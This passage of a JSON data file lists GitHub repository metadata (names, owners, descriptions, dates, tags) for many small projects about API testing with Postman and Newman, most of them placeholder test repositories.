request"]},{"id":183202101,"name":"gemma-postman-tests","full_name":"VNG-Realisatie/gemma-postman-tests","description":null,"fork":false,"created_at":"2019-04-24T10:02:56Z","updated_at":"2019-12-16T14:01:15Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":34739001,"owner_login":"VNG-Realisatie","owner_avatar_url":"https://avatars1.githubusercontent.com/u/34739001?v=4","pulled":1,"tags":[]},{"id":243183725,"name":"Postman-Test-Repo-1","full_name":"virenbochare/Postman-Test-Repo-1","description":"This is test repository for Postman","fork":false,"created_at":"2020-02-26T06:16:45Z","updated_at":"2020-02-26T06:16:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58376947,"owner_login":"virenbochare","owner_avatar_url":"https://avatars1.githubusercontent.com/u/58376947?v=4","pulled":1,"tags":["test","repo","repos","repository"]},{"id":251084762,"name":"IntegrationTest","full_name":"pandeyashish/IntegrationTest","description":"Integration testing for api using postman","fork":false,"created_at":"2020-03-29T16:59:04Z","updated_at":"2020-03-30T07:58:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13725689,"owner_login":"pandeyashish","owner_avatar_url":"https://avatars3.githubusercontent.com/u/13725689?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":124437063,"name":"yarn-postman-newman","full_name":"saimatsumoto/yarn-postman-newman","description":"a mock-up repo to test out running postman API test with newman, installed via yarn instead of npm","fork":false,"created_at":"2018-03-08T19:18:57Z","updated_at":"2018-03-08T19:18:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25797778,"owner_login":"saimatsumoto","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25797778?v=4","pulled":1,"tags":["test"," postman","repo","newman","running","mock","install","installed","instead"]},{"id":124415610,"name":"postman-newman-jenkins","full_name":"saimatsumoto/postman-newman-jenkins","description":"Testing to run postman API tests with Newman in order to integrate with Jenkins in the future","fork":false,"created_at":"2018-03-08T16:06:22Z","updated_at":"2018-03-08T16:06:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25797778,"owner_login":"saimatsumoto","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25797778?v=4","pulled":1,"tags":["test"," postman","tests","tests ","integrate","order","future"]},{"id":197026700,"name":"testing-and-automation","full_name":"loopDelicious/testing-and-automation","description":"Workshop for testing and automation in Postman","fork":false,"created_at":"2019-07-15T15:36:28Z","updated_at":"2019-07-22T23:45:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17693714,"owner_login":"loopDelicious","owner_avatar_url":"https://avatars0.githubusercontent.com/u/17693714?v=4","pulled":1,"tags":["test","testing","auto","automat","automation","shop"]},{"id":249952821,"name":"missguided-app-test","full_name":"majdukovic/missguided-app-test","description":"Appium and Postman test for Missguided app","fork":false,"created_at":"2020-03-25T10:49:42Z","updated_at":"2020-03-27T14:32:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8328229,"owner_login":"majdukovic","owner_avatar_url":"https://avatars1.githubusercontent.com/u/8328229?v=4","pulled":1,"tags":["test","guide"]},{"id":234612174,"name":"Hello-Postman-2","full_name":"Gencid/Hello-Postman-2","description":"Repository for testing correct name and status 201","fork":false,"created_at":"2020-01-17T18:33:36Z","updated_at":"2020-01-17T18:33:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44362463,"owner_login":"Gencid","owner_avatar_url":"https://avatars3.githubusercontent.com/u/44362463?v=4","pulled":1,"tags":["test","testing","stat","name","status","correct"]},{"id":208332412,"name":"loadtest","full_name":"cheese-hub/loadtest","description":"Postman-based load test for Cheesehub","fork":false,"created_at":"2019-09-13T19:26:39Z","updated_at":"2019-09-16T17:32:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41589726,"owner_login":"cheese-hub","owner_avatar_url":"https://avatars1.githubusercontent.com/u/41589726?v=4","pulled":1,"tags":["test","based","load"]},{"id":112169992,"name":"docker-postman-tomee-mysql","full_name":"Kichachi/docker-postman-tomee-mysql","description":"Docker with postman tests with tomee and mysql","fork":false,"created_at":"2017-11-27T08:40:55Z","updated_at":"2017-11-27T08:40:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17799727,"owner_login":"Kichachi","owner_avatar_url":"https://avatars0.githubusercontent.com/u/17799727?v=4","pulled":1,"tags":["test"," postman","tests","tests ","mysql","postman tests","tomee"]},{"id":90686720,"name":"API_Testing_AutomationWithNewmanFromCommandLine","full_name":"OmarFlores1/API_Testing_AutomationWithNewmanFromCommandLine","description":"API testing with Postman and Newman","fork":false,"created_at":"2017-05-09T01:02:53Z","updated_at":"2017-05-09T01:02:53Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":28547425,"owner_login":"OmarFlores1","owner_avatar_url":"https://avatars3.githubusercontent.com/u/28547425?v=4","pulled":1,"tags":["test","testing"]},{"id":235041529,"name":"JsonData","full_name":"ritika-shakwar/JsonData","description":"created json data for testing postman","fork":false,"created_at":"2020-01-20T07:20:10Z","updated_at":"2020-01-20T07:21:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":56882274,"owner_login":"ritika-shakwar","owner_avatar_url":"https://avatars3.githubusercontent.com/u/56882274?v=4","pulled":1,"tags":["test"," postman","create","data","testing","json"]},{"id":242084854,"name":"LaravelPassport","full_name":"ronaldoarriola/LaravelPassport","description":"Laravel API + Token Auth for Postman tests.","fork":false,"created_at":"2020-02-21T07:59:09Z","updated_at":"2020-03-03T02:45:22Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":35204764,"owner_login":"ronaldoarriola","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35204764?v=4","pulled":1,"tags":["test","tests"]},{"id":204939862,"name":"Repos-Created-By-Postman","full_name":"fpachelli/Repos-Created-By-Postman","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-08-28T13:35:00Z","updated_at":"2019-08-28T13:35:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":53526290,"owner_login":"fpachelli","owner_avatar_url":"https://avatars1.githubusercontent.com/u/53526290?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":249636771,"name":"Kanwar-Github-Postman-Assignment","full_name":"KanwarNarania/Kanwar-Github-Postman-Assignment","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-03-24T07:06:15Z","updated_at":"2020-03-27T04:09:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":62278020,"owner_login":"KanwarNarania","owner_avatar_url":"https://avatars3.githubusercontent.com/u/62278020?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":151468466,"name":"task2-jairo-newman","full_name":"dmc152/task2-jairo-newman","description":"Todoist restapi test using postman and newman","fork":false,"created_at":"2018-10-03T19:27:54Z","updated_at":"2018-10-03T19:29:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22991424,"owner_login":"dmc152","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22991424?v=4","pulled":1,"tags":["test"," postman","rest","newman","restapi"]},{"id":181372159,"name":"litmus","full_name":"avinashb98/litmus","description":"Behaviour driven API testing framework for Postman","fork":false,"created_at":"2019-04-14T21:39:28Z","updated_at":"2019-04-14T21:39:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17886999,"owner_login":"avinashb98","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17886999?v=4","pulled":1,"tags":["test","testing","framework","drive","driven"]},{"id":136216442,"name":"Postman_CI","full_name":"KamilPrus/Postman_CI","description":"Repository used to show how set CI with Postman tests, Newmann and Travis","fork":false,"created_at":"2018-06-05T18:10:06Z","updated_at":"2018-06-06T11:10:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18649364,"owner_login":"KamilPrus","owner_avatar_url":"https://avatars2.githubusercontent.com/u/18649364?v=4","pulled":1,"tags":["test","tests"]},{"id":223286046,"name":"Postman-JSONdb","full_name":"Jaxs01/Postman-JSONdb","description":"some simple End to End tests with installed Node.js and Postman","fork":false,"created_at":"2019-11-21T23:48:02Z","updated_at":"2019-11-21T23:54:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20965028,"owner_login":"Jaxs01","owner_avatar_url":"https://avatars1.githubusercontent.com/u/20965028?v=4","pulled":1,"tags":["test","tests","tests ","install","installed"]},{"id":168756533,"name":"Postman-Newman-API-Testing-FCOM-Test-Phrase-","full_name":"shasha131/Postman-Newman-API-Testing-FCOM-Test-Phrase-","description":"How to use postman/Newman to do data driven(large data file) API request and testing ","fork":false,"created_at":"2019-02-01T20:31:43Z","updated_at":"2019-02-01T20:35:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41800014,"owner_login":"shasha131","owner_avatar_url":"https://avatars2.githubusercontent.com/u/41800014?v=4","pulled":1,"tags":["test"," postman","data","testing","request","file","to do","drive","driven"]},{"id":236539572,"name":"TestingExample","full_name":"KarthikBommineni/TestingExample","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-01-27T16:43:58Z","updated_at":"2020-01-27T16:43:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35219166,"owner_login":"KarthikBommineni","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35219166?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":128750812,"name":"postman-travis-integration","full_name":"dangkaka/postman-travis-integration","description":"Using postman(newman) to build APIs smoke test","fork":false,"created_at":"2018-04-09T09:54:59Z","updated_at":"2018-06-30T06:41:38Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":8704270,"owner_login":"dangkaka","owner_avatar_url":"https://avatars0.githubusercontent.com/u/8704270?v=4","pulled":1,"tags":["test"," postman","newman","build","smoke"]},{"id":6564567,"name":"postman_moogly","full_name":"moogly81/postman_moogly","description":"a test just for me, don't expect anything usefull here","fork":false,"created_at":"2012-11-06T15:43:39Z","updated_at":"2013-01-13T00:22:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2691085,"owner_login":"moogly81","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2691085?v=4","pulled":1,"tags":["test","full","useful","expect","usefull"]},{"id":213965065,"name":"TestrepositoryA","full_name":"Zerep08/TestrepositoryA","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-10-09T16:12:52Z","updated_at":"2019-10-09T16:12:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32379040,"owner_login":"Zerep08","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32379040?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":238392878,"name":"MyFirstPostmanTestSuite","full_name":"Aleena10/MyFirstPostmanTestSuite","description":null,"fork":false,"created_at":"2020-02-05T07:30:40Z","updated_at":"2020-02-05T07:34:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20670474,"owner_login":"Aleena10","owner_avatar_url":"https://avatars2.githubusercontent.com/u/20670474?v=4","pulled":1,"tags":[]},{"id":220861931,"name":"TestesAutomatizados","full_name":"gomesevelyn/TestesAutomatizados","description":"Realização de testes automatizados em API's via Postman","fork":false,"created_at":"2019-11-10T22:50:48Z","updated_at":"2019-11-11T09:50:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25755076,"owner_login":"gomesevelyn","owner_avatar_url":"https://avatars3.githubusercontent.com/u/25755076?v=4","pulled":1,"tags":["test","auto","automat","testes","automatizado","automatizados"]},{"id":117556886,"name":"test-postman-sample-t300","full_name":"telosys-samples-v3/test-postman-sample-t300","description":null,"fork":false,"created_at":"2018-01-15T14:40:49Z","updated_at":"2018-01-15T14:54:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35448619,"owner_login":"telosys-samples-v3","owner_avatar_url":"https://avatars3.githubusercontent.com/u/35448619?v=4","pulled":1,"tags":[]},{"id":202239693,"name":"concourse-postman-task","full_name":"atzawada/concourse-postman-task","description":"A task to better handle running Postman tests in Concourse.","fork":false,"created_at":"2019-08-13T23:51:16Z","updated_at":"2019-08-20T14:23:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32112934,"owner_login":"atzawada","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32112934?v=4","pulled":1,"tags":["test","tests","tests ","running","course","task","handle","better"]},{"id":233061344,"name":"Test1-repository","full_name":"Preetha-github/Test1-repository","description":"This is a test1 repository created by Postman","fork":false,"created_at":"2020-01-10T14:14:23Z","updated_at":"2020-01-10T14:14:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":59710717,"owner_login":"Preetha-github","owner_avatar_url":"https://avatars0.githubusercontent.com/u/59710717?v=4","pulled":1,"tags":["test","create","repo","repos","repository","test1"]},{"id":226272359,"name":"test5","full_name":"itsatya/test5","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-12-06T07:36:31Z","updated_at":"2019-12-06T07:36:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11086631,"owner_login":"itsatya","owner_avatar_url":"https://avatars0.githubusercontent.com/u/11086631?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":220164831,"name":"TestRepositary","full_name":"Archana-design/TestRepositary","description":"This is a test repositary created by Postman","fork":false,"created_at":"2019-11-07T06:14:51Z","updated_at":"2019-11-07T07:03:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54472782,"owner_login":"Archana-design","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54472782?v=4","pulled":1,"tags":["test","create","repo","repos","repositary"]},{"id":222802381,"name":"TestRepository","full_name":"Radeek/TestRepository","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-19T22:30:42Z","updated_at":"2019-11-19T22:30:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":115293928,"name":"AutoTests","full_name":"CoproCodeForces-And-Friends/AutoTests","description":"Some Autotest for testing KFC-API.","fork":false,"created_at":"2017-12-25T00:26:36Z","updated_at":"2019-11-14T12:04:59Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":33433403,"owner_login":"CoproCodeForces-And-Friends","owner_avatar_url":"https://avatars2.githubusercontent.com/u/33433403?v=4","pulled":1,"tags":["test","testing"]},{"id":184657737,"name":"cs122b-postman-tests","full_name":"brandonteran/cs122b-postman-tests","description":null,"fork":false,"created_at":"2019-05-02T22:04:53Z","updated_at":"2019-09-17T23:34:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19476698,"owner_login":"brandonteran","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19476698?v=4","pulled":1,"tags":[]},{"id":192630025,"name":"HttpBinOrg-Postman-Test","full_name":"ryma083/HttpBinOrg-Postman-Test","description":null,"fork":false,"created_at":"2019-06-19T00:26:53Z","updated_at":"2019-06-26T18:31:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47198277,"owner_login":"ryma083","owner_avatar_url":"https://avatars1.githubusercontent.com/u/47198277?v=4","pulled":1,"tags":[]},{"id":222803929,"name":"TestRepository2","full_name":"Radeek/TestRepository2","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-19T22:41:55Z","updated_at":"2019-11-19T22:41:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":249230237,"name":"TestRepository2856","full_name":"dar-lys/TestRepository2856","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-03-22T16:58:56Z","updated_at":"2020-03-22T16:58:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":62504923,"owner_login":"dar-lys","owner_avatar_url":"https://avatars3.githubusercontent.com/u/62504923?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":223670680,"name":"testRepository5","full_name":"Radeek/testRepository5","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-24T00:11:45Z","updated_at":"2019-11-24T00:11:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":144125384,"name":"newman-postman-docker","full_name":"gunesmes/newman-postman-docker","description":"Run your service / microservice / API test with Postman, create test steps in Postman and run them with Newman in a Docker via cli","fork":false,"created_at":"2018-08-09T08:44:37Z","updated_at":"2020-01-14T09:50:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":956628,"owner_login":"gunesmes","owner_avatar_url":"https://avatars1.githubusercontent.com/u/956628?v=4","pulled":1,"tags":["test","create","service","micro","microservice","steps"]},{"id":222805628,"name":"testRepository4","full_name":"Radeek/testRepository4","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-19T22:54:23Z","updated_at":"2019-11-19T23:36:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":223806435,"name":"TestRepository5.287448086179117","full_name":"Radeek/TestRepository5.287448086179117","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-24T20:35:55Z","updated_at":"2019-11-24T20:35:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":241952547,"name":"Test2-repository-","full_name":"Camonadas/Test2-repository-","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-02-20T17:54:39Z","updated_at":"2020-02-20T17:54:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7605559,"owner_login":"Camonadas","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7605559?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":222804087,"name":"testRepository3","full_name":"Radeek/testRepository3","description":" This is a test repository created by Postman","fork":false,"created_at":"2019-11-19T22:42:59Z","updated_at":"2019-11-19T22:42:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57967232,"owner_login":"Radeek","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57967232?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":171877231,"name":"Test_Automation_Newman_API","full_name":"sza313/Test_Automation_Newman_API","description":"Test automation framework in Postman / Newman for API testing","fork":false,"created_at":"2019-02-21T13:30:51Z","updated_at":"2019-03-13T14:24:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24241788,"owner_login":"sza313","owner_avatar_url":"https://avatars0.githubusercontent.com/u/24241788?v=4","pulled":1,"tags":["test","testing","auto","automat","framework","automation"]},{"id":241952450,"name":"Test2-repository-.-RandomName-","full_name":"Camonadas/Test2-repository-.-RandomName-","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-02-20T17:54:11Z","updated_at":"2020-02-20T17:54:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7605559,"owner_login":"Camonadas","owner_avatar_url":"https://avatars2.githubusercontent.com/u/7605559?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":213963233,"name":"Testrepo","full_name":"Zerep08/Testrepo","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-10-09T16:04:33Z","updated_at":"2019-10-09T16:04:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32379040,"owner_login":"Zerep08","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32379040?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":234619024,"name":"Postman-Repository-okrwf6lgoj","full_name":"Gencid/Postman-Repository-okrwf6lgoj","description":"Repository for testing correct name and status 201","fork":false,"created_at":"2020-01-17T19:12:24Z","updated_at":"2020-01-17T19:12:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44362463,"owner_login":"Gencid","owner_avatar_url":"https://avatars3.githubusercontent.com/u/44362463?v=4","pulled":1,"tags":["test","testing","stat","name","status","correct"]},{"id":164997909,"name":"testrail","full_name":"bharath411/testrail","description":"This repository contains testrail restapi requests in postman collections.","fork":false,"created_at":"2019-01-10T05:45:51Z","updated_at":"2019-01-11T17:02:39Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":8632970,"owner_login":"bharath411","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8632970?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","repo","request","postman collection","repos","repository","rest","requests","contain","postman collections","restapi","testrail"]},{"id":206310641,"name":"Testing","full_name":"akspj/Testing","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-04T12:09:59Z","updated_at":"2019-09-04T12:09:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46963954,"owner_login":"akspj","owner_avatar_url":"https://avatars3.githubusercontent.com/u/46963954?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":236507592,"name":"Testing","full_name":"KarthikBommineni/Testing","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-01-27T14:22:54Z","updated_at":"2020-01-27T14:22:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35219166,"owner_login":"KarthikBommineni","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35219166?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":70267698,"name":"UFT_PostMan_Driver","full_name":"chit786/UFT_PostMan_Driver","description":"Full integration of HP UFT with Newman test scripts using command line","fork":false,"created_at":"2016-10-07T17:19:59Z","updated_at":"2016-10-10T15:55:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18376182,"owner_login":"chit786","owner_avatar_url":"https://avatars2.githubusercontent.com/u/18376182?v=4","pulled":1,"tags":["test","script","line","scripts","integration","command","command line"]},{"id":55211213,"name":"beach-day","full_name":"PepkorIT/beach-day","description":"API integration testing as fun as a day on the beach","fork":false,"created_at":"2016-04-01T07:08:42Z","updated_at":"2020-02-04T13:04:41Z","stargazers_count":3,"watchers_count":3,"forks":1,"watchers":3,"score":1,"owner_id":18207186,"owner_login":"PepkorIT","owner_avatar_url":"https://avatars3.githubusercontent.com/u/18207186?v=4","pulled":1,"tags":["test","testing","integration","beach"]},{"id":207448841,"name":"Test-repository","full_name":"Susee73/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-10T02:35:44Z","updated_at":"2019-09-10T02:35:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54784569,"owner_login":"Susee73","owner_avatar_url":"https://avatars2.githubusercontent.com/u/54784569?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":221714016,"name":"Test-repository","full_name":"anniebnt/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-11-14T14:16:42Z","updated_at":"2019-11-14T14:16:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57755501,"owner_login":"anniebnt","owner_avatar_url":"https://avatars2.githubusercontent.com/u/57755501?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":239347673,"name":"Test-repository","full_name":"JishaKackattil/Test-repository","description":"This is a test repository created by postman","fork":false,"created_at":"2020-02-09T17:51:31Z","updated_at":"2020-02-09T17:51:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":60303121,"owner_login":"JishaKackattil","owner_avatar_url":"https://avatars3.githubusercontent.com/u/60303121?v=4","pulled":1,"tags":["test"," postman","create","repo","repos","repository"]},{"id":246624118,"name":"Test-repository","full_name":"ronnsicuan/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-03-11T16:32:23Z","updated_at":"2020-03-11T16:32:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7823813,"owner_login":"ronnsicuan","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7823813?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":230868727,"name":"Test-repository","full_name":"charithardhreddy/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-12-30T07:24:01Z","updated_at":"2019-12-30T07:24:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":59354353,"owner_login":"charithardhreddy","owner_avatar_url":"https://avatars1.githubusercontent.com/u/59354353?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":236500983,"name":"Test-repositorya","full_name":"KarthikBommineni/Test-repositorya","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-01-27T13:51:33Z","updated_at":"2020-01-27T13:51:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35219166,"owner_login":"KarthikBommineni","owner_avatar_url":"https://avatars2.githubusercontent.com/u/35219166?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":223937967,"name":"Test-repository","full_name":"AlinaFelinska/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-11-25T11:58:21Z","updated_at":"2019-11-25T11:58:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58171752,"owner_login":"AlinaFelinska","owner_avatar_url":"https://avatars1.githubusercontent.com/u/58171752?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":201205890,"name":"Test-repostory","full_name":"GabrielaBuftea/Test-repostory","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-08-08T07:43:06Z","updated_at":"2019-08-08T07:43:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40985461,"owner_login":"GabrielaBuftea","owner_avatar_url":"https://avatars3.githubusercontent.com/u/40985461?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":218095778,"name":"Test-repository","full_name":"RebrykVasyl/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-10-28T16:32:03Z","updated_at":"2019-10-28T16:32:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55355139,"owner_login":"RebrykVasyl","owner_avatar_url":"https://avatars1.githubusercontent.com/u/55355139?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":210941039,"name":"Test-repository","full_name":"Arshads2/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-25T21:09:40Z","updated_at":"2019-09-25T21:09:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55810742,"owner_login":"Arshads2","owner_avatar_url":"https://avatars1.githubusercontent.com/u/55810742?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":250093453,"name":"Test-repository","full_name":"jshalabi/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-03-25T21:18:15Z","updated_at":"2020-03-25T21:18:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15658038,"owner_login":"jshalabi","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15658038?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":250091231,"name":"Test-repository","full_name":"kmonaheng73/Test-repository","description":"This is a test repository created by Postman","fork":false,"created_at":"2020-03-25T21:05:26Z","updated_at":"2020-03-25T21:05:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":62523692,"owner_login":"kmonaheng73","owner_avatar_url":"https://avatars2.githubusercontent.com/u/62523692?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":176346742,"name":"PostmanMock","full_name":"adanil/PostmanMock","description":null,"fork":false,"created_at":"2019-03-18T18:30:27Z","updated_at":"2019-05-15T12:10:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31052524,"owner_login":"adanil","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31052524?v=4","pulled":1,"tags":[]},{"id":223825449,"name":"create-mock-api","full_name":"Daiana-Brites-Kirschner/create-mock-api","description":"Como criar uma API mockada para fazer testes no 